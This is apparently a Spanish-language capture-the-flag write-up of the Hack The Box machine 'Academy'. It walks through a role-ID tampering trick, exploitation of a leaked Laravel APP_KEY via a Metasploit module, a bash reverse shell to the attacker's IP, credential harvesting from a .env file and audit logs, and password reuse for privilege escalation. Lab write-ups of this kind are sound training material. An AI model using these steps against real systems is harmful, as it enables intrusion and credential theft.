PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

-Añadimos el siguiente dominio al /etc/hosts:
	-academy.htb

-Podemos registrarnos en la ruta -->/register.php

-Nos creamos un usuario y en la ruta /login.php entramos. Dentro no hay nada interesante que podamos hacer.

-También hay una ruta /admin.php pero no nos deja entrar con el usuario que hemos creado

-Volvemos a /register.php e interceptamos la petición con Burpsuite. Vemos un campo 'roleid=0'. 
	
-Probamos a cambiar el valor a 'roleid=1' y enviamos la petición para registrar al usuario

-Volvemos a autenticarnos en /admin.php, esta vez con el nuevo usuario y estamos dentro.

-Dentro, vemos que existe el siguiente subdominio --> **dev-staging-01.academy.htb**
	-Lo añadimos al /etc/hosts y entramos en:
		 http://dev-staging-01.academy.htb/

-Dentro del nuevo dominio, vemos que la applicación está corriendo en Laravel, un framework de php. También vemos el siguiente valor interesante:
	APP_KEY: "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="|

-Buscamos en google --> **laravel app_key exploit** y encontramos el siguiente CVE:
	-CVE-2018-15133: laravel_token_unserialize

-Encontramos el siguiente módulo de Metasploit para explotar:
	-Módulo --> **exploit/unix/http/laravel_token_unserialize_exec**
		-set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
		-set rhosts dev-staging-01.academy.htb
		-set lhost 10.10.14.29
		-run
			whoami
			www-data

-Nos mandamos una reverse shell para trabajar más comodamente:
	-bash -c 'bash -i >& /dev/tcp/10.10.14.29/1234 0>&1'
		www-data@academy:/$

## Escalada de Privilegios

-La flag está en el directorio del usuario 'cry0l1t3' , pero no tenemos permisos de lectura

-Navegamos a '/var/www/html/academy$' y vemos el contenido del fichero '.env', que es dónde se guadan las variables de entorno:
	-cat .env
		DB_CONNECTION=mysql
		DB_DATABASE=academy
		DB_USERNAME=dev
		DB_PASSWORD=mySup3rP4s5w0rd!!

-Parece que tenemos credenciales para acceder a mysql en localhost. Sin embargo, probamos y no nos son válidas.

-Probamos la contraseña obtenida en el usuario 'cry0l1t3', a ver si podemos pivotar de user:
	-su cry0l1t3
	-password: mySup3rP4s5w0rd!!
		cry0l1t3@academy:/$
		(HA FUNCIONADO!!)

-El nuevo usuario está dentro del grupp 'adm', por lo que podemos leer los ficheros de logs en '/var/log$'


grep -r TTY | awk 'NF{print $NF}' | awk '{print $2}' FS="=" | xxd -ps -r | less -S
	su mrb3n
	mrb3n_Ac@d3my!

sudo -l:
	/usr/bin/composer
